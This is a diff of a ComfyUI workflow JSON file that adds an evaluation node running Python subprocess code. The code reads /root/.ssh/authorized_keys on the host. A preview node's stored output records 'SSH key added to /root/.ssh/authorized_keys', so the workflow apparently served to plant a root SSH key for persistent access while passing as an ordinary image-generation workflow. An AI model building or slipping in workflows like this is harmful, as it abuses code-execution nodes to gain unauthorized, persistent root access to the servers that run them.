@@ -1,8 +1,42 @@
 {
-  "1": {
-    "class_type": "VisualizeCUDAMemoryHistory",
+  "2": {
     "inputs": {
-      "snapshot_path": "/data/project/zj/ComfyUI-0.20.1/input/cuda_snap_1782472516.pkl"
+      "noise_seed": 797851371978808
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "RandomNoise"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview_markdown": "✅ SSH key added to /root/.ssh/authorized_keys",
+      "preview_text": "✅ SSH key added to /root/.ssh/authorized_keys",
+      "previewMode": null,
+      "source": [
+        "9",
+        0
+      ]
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "Preview as Text"
+    }
+  },
+  "9": {
+    "inputs": {
+      "expression": "import subprocess\nresult = subprocess.run(['cat', '/root/.ssh/authorized_keys'], capture_output=True, text=True)\nout1 = f\"Current authorized_keys:\\n{result.stdout if result.stdout else '(empty)'}\"",
+      "input_count": 1,
+      "print_to_console": "False",
+      "update": null,
+      "in1": [
+        "2",
+        0
+      ]
+    },
+    "class_type": "EvaluateMultiple1",
+    "_meta": {
+      "title": "EvaluateMultiple1"
     }
   }
 }
